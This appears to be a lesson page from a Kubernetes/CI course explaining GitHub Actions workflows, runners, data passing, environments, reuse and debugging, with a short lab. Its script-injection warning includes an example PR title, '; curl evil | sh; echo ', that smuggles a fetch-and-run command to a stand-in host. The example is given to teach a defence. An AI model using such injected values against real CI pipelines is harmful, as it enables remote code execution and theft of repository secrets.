GitHub Actions is CI that lives next to the code: a YAML file in .github/workflows/ describes when to run, what to run, and where. Because it is the default for anything hosted on GitHub, it is the CI most Kubernetes teams meet first. This page takes the workflow file apart — events, jobs, steps, runners, contexts, secrets, matrices, caching, reuse — and then shows what a "runner" actually is at the Linux level, because that is where every confusing failure comes from.

The shape of a workflow

eventtriggers →workflow (one YAML file)contains →jobs (parallel, each on its own runner)contain →steps (sequential, same runner)
# .github/workflows/ci.yml
name: ci
on:
  push:
    branches: [main]
    paths-ignore: ["docs/**"]
  pull_request:
  workflow_dispatch:
    inputs:
      env: { type: choice, options: [dev, staging], default: dev }
permissions:
  contents: read                  # least privilege for GITHUB_TOKEN
env:
  IMAGE: ghcr.io/${{ github.repository }}
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix: { node: [20, 22] }
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: "${{ matrix.node }}", cache: npm }
      - run: npm ci
      - run: npm test -- --reporter junit --output test.xml
      - uses: actions/upload-artifact@v4
        if: always()
        with: { name: junit-${{ matrix.node }}, path: test.xml }
  build:
    needs: [test]
    runs-on: ubuntu-latest
    outputs:
      tag: ${{ steps.meta.outputs.tag }}
    steps:
      - uses: actions/checkout@v4
      - id: meta
        run: echo "tag=${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"
      - run: docker build -t "$IMAGE:${{ steps.meta.outputs.tag }}" .
  • on — the events. push/pull_request with branch/path filters; workflow_dispatch adds a "Run workflow" button with typed inputs; schedule takes cron (UTC); release, workflow_call (reusable), repository_dispatch (API-triggered).
  • permissions — scopes of the automatic GITHUB_TOKEN. Default is read/write-everything on older repos; set it explicitly like a Role (Day 36): contents: read, packages: write, id-token: write.
  • env — variables at workflow, job or step level; the innermost wins. Available as real environment variables inside run:.
  • concurrency — one run per group; cancel-in-progress kills the previous run on the same branch.
  • jobs.*.runs-on — which runner: a hosted label (ubuntu-latest, ubuntu-24.04) or self-hosted labels.
  • strategy.matrix — expands the job into one job per combination (here two). fail-fast, max-parallel, include/exclude tune it.
  • steps — uses: runs an action (a reusable unit from the marketplace or a repo, pinned with @v4 or a SHA); run: runs a shell script. Steps share the runner's filesystem and run in order.
  • needs — job dependencies; the DAG. A job with needs waits for those jobs and is skipped if they fail.
  • outputs — strings a job exposes to jobs that need it, read as ${{ needs.build.outputs.tag }}.

This is a manifest in the Day 9 sense: declarative, in git, reviewed in PRs. But there is no reconcile loop — a workflow is a program that runs once per event. That distinction (event-driven script vs. continuously reconciled state) is exactly what separates CI from GitOps, and comes back in C6.

What a runner really is

A runner is a machine with the GitHub Actions runner agent installed — a .NET program (Runner.Listener) that long-polls GitHub asking "any job for my labels?". When a job arrives, it forks a Runner.Worker that executes the steps one by one and streams logs back. That is all the magic there is.

GitHub-hosted

  • A fresh VM per job (Ubuntu/Windows/macOS), destroyed afterwards. Nothing survives between jobs except what you upload (artifacts, cache).
  • ubuntu-latest: 4 vCPU / 16 GB for public repos, a large preinstalled toolset (docker, kubectl, helm, node, python, gcloud/aws/az CLIs…).
  • Runs as user runner with passwordless sudo; workspace at /home/runner/work/<repo>/<repo>.
  • Free minutes for public repos; billed per minute for private (Linux cheapest).

Self-hosted

  • You install the agent on your own VM/container/cluster and register it with labels (runs-on: [self-hosted, linux, gpu]).
  • Persistent by default: the workspace and everything you installed stay between jobs — faster, but dirty state and leaked secrets are on you. Use --ephemeral (one job then exit) for hygiene.
  • Needed for: access to private networks/clusters, special hardware, cost at scale. In Kubernetes, actions-runner-controller creates ephemeral runner Pods on demand (C3).
  • Never use self-hosted runners for public repos: a PR from anyone runs arbitrary code on your machine.

On a self-hosted Linux box the agent is a systemd service (./svc.sh install writes actions.runner.*.service; journalctl -u actions.runner… is where its logs go — L7). Every run: step is written to a temp file and executed as bash --noprofile --norc -eo pipefail /tmp/….sh — a child process with the step's env: merged into its environment, whose exit status decides pass/fail (L1). A container: job is the same thing with the worker running the steps inside a Docker container (L2). Cancelling a job sends SIGINT then SIGTERM to that process tree — which is why a step that ignores signals "hangs" until the 5-minute kill.

${{ … }} is evaluated by GitHub before the step runs; the result is substituted as text. Inside run: you can also just read the environment variables GitHub sets.

    steps:
      - if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
        run: echo "release build"
      - if: failure()                      # only when an earlier step failed; also always(), success(), cancelled()
        run: ./notify.sh
      - if: contains(github.event.head_commit.message, '[skip e2e]') == false
        run: make e2e
      - run: echo "cache key ${{ hashFiles('**/package-lock.json') }}"

Script injection. run: echo "${{ github.event.pull_request.title }}" pastes untrusted text into a shell script before it runs — a PR titled "; curl evil | sh; echo " executes. Pass untrusted values through env: and reference the variable (echo "$TITLE") so the shell sees data, not code. Same rule as SQL parameters.

Passing data around

Between steps (same job)
The filesystem — steps share the workspace. For variables: echo "TAG=abc" >> "$GITHUB_ENV" makes $TAG exist in later steps; echo "tag=abc" >> "$GITHUB_OUTPUT" exposes steps.<id>.outputs.tag. Both are literally files the worker reads after each step.
Between jobs
Nothing is shared — different VMs. Small strings: job outputs. Files: actions/upload-artifact → actions/download-artifact (stored on GitHub, retention configurable). Images: push to a registry.
Between runs
actions/cache keyed by a hash of lock files (setup-node/setup-go do this for you); Docker layer cache via buildx cache-to: type=gha (C3). Cache is best-effort: a miss must still work.
Into the job from outside
Secrets and variables (repo → environment → org precedence), workflow_dispatch inputs, the event payload.

Secrets here behave like Kubernetes Secrets (Day 28) with the same caveat: encryption at rest and masking in logs do not stop a step from curl-ing the value somewhere. Treat every third-party action you uses: as code that can read the job's secrets, and pin it to a commit SHA rather than a movable tag — the same immutable-vs-mutable argument as image tags in C1.

Containers and service containers

jobs:
  integration:
    runs-on: ubuntu-latest
    container: { image: golang:1.23 }         # steps run INSIDE this container (workspace bind-mounted)
    services:
      postgres:
        image: postgres:16
        env: { POSTGRES_PASSWORD: test }
        options: --health-cmd "pg_isready" --health-interval 5s --health-retries 10
    steps:
      - uses: actions/checkout@v4
      - run: go test ./...
        env: { DATABASE_URL: postgres://postgres:test@postgres:5432/postgres }   # reachable by service name

The runner puts the job container and every service on one Docker bridge network, so postgres resolves by name — the same veth + bridge + embedded DNS mechanism as Docker Compose (Day 3, L5). Without container:, services are still started but you reach them on localhost:<mapped port> because your steps run on the host VM, outside that network namespace.

Environments, approvals and gates

An environment (Settings → Environments) is a named target such as production with its own secrets, protection rules (required reviewers, wait timer, branch restrictions) and deployment history. A job that declares environment: production pauses until the rules are satisfied — this is how you implement Continuous Delivery with a human decision.

  deploy-prod:
    needs: [build]
    runs-on: ubuntu-latest
    environment: { name: production, url: https://shop.example.com }
    steps:
      - run: echo "deploying ${{ needs.build.outputs.tag }}"      # runs only after a reviewer approves

Reuse: reusable workflows and composite actions

Reusable workflow

A whole workflow with on: workflow_call (typed inputs, secrets, outputs), invoked as a job: jobs.build.uses: acme/.github/.github/workflows/build.yml@main with with: and secrets: inherit. Its jobs run on their own runners. Use for "the org's standard build-and-push pipeline".

Composite action

A directory with action.yml (runs: using: composite) bundling several steps into one uses:. Runs inside the calling job on the same runner. Use for "set up our toolchain" or "log in to our registry". JavaScript and Docker-container actions are the other two kinds.

Reusable workflows are to pipelines what a Helm chart is to manifests: one parameterised definition, many callers passing values. The same trade-off applies — a tag like @main means every caller changes when the template changes; pin to @v2 or a SHA for stability.

Debugging a run

$ gh run list --workflow ci.yml --limit 5              # the gh CLI mirrors the UI
$ gh run watch                                          # follow the latest run live
$ gh run view 123456789 --log-failed                    # only the failing step's log
$ gh workflow run ci.yml -f env=staging                 # trigger a workflow_dispatch
$ gh secret set KUBECONFIG < ~/.kube/ci-config           # set a secret from a file
# Re-run with debug logging: set repo secret ACTIONS_STEP_DEBUG=true, or "Re-run jobs → Enable debug logging"
# Poke the runner from a step:
      - run: |
          id; pwd; echo "$GITHUB_WORKSPACE"; env | grep -E '^(GITHUB|RUNNER)_' | sort
          docker version --format '{{.Server.Version}}'; kubectl version --client

Most "works on my machine, fails in Actions" cases are: a file path assumed relative to somewhere else (cd does not persist between steps — each run: starts in $GITHUB_WORKSPACE); a tool version difference (pin with setup-* actions); an env var set in one step and expected in the next without $GITHUB_ENV; or a non-zero exit from a command whose failure you never noticed locally because your shell was not -e.

Hands-on lab (25 min) — a real workflow, watched from the CLI

  1. Create a repo and push the C1 lab app (or any small project). Install the gh CLI and gh auth login.
  2. Add the workflow — save the first YAML on this page as .github/workflows/ci.yml, but replace the npm steps with sh test.sh and the docker build from C1. Commit and push.
  3. Watch it: gh run watch. Open the run in the browser too; expand a step and compare the log with what you expect from the runner animation above.
  4. Break a test, push, and confirm the build job shows as skipped, not failed — needs in action.
  5. Pass data: add echo "tag=${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT" in a step with id: meta, expose it as a job output, and print it from a second job with needs. Then try printing it from a job without needs and see the empty string.
  6. Inspect the runner: add the "poke the runner" step. Note the user, the workspace path, and that docker works — you will need that in C3.
  7. Add a matrix over two values and watch two jobs appear from one definition.
A step does export TAG=abc and the next step's echo $TAG prints nothing. Why?

Each run: is a separate bash process; an export dies with it (L1: environment is inherited by children, never passed back to parents or siblings). Write TAG=abc >> "$GITHUB_ENV"; the worker reads that file and injects the variable into subsequent steps.

Two jobs, build and deploy, both runs-on: ubuntu-latest. build creates dist/app.tar; deploy can't find it. Fix?

Different jobs run on different VMs. Either upload the file as an artifact in build and download it in deploy (needs: [build]), or push it to a registry/bucket, or merge the two jobs. For images, the registry is the artifact store.

Key takeaways

  • Workflow = file; job = unit of parallelism on its own runner; step = sequential command or action on that runner. needs builds the DAG.
  • A runner is a normal process on a normal machine; hosted runners are fresh VMs per job, self-hosted ones persist unless ephemeral.
  • ${{ }} is evaluated before the shell runs — never paste untrusted input into run:; route it through env:.
  • Data crosses steps via files ($GITHUB_ENV, $GITHUB_OUTPUT), jobs via outputs/artifacts, runs via cache — nothing is shared implicitly.
  • Set permissions: explicitly, pin actions to SHAs, use environments for approvals, reusable workflows for the org standard.
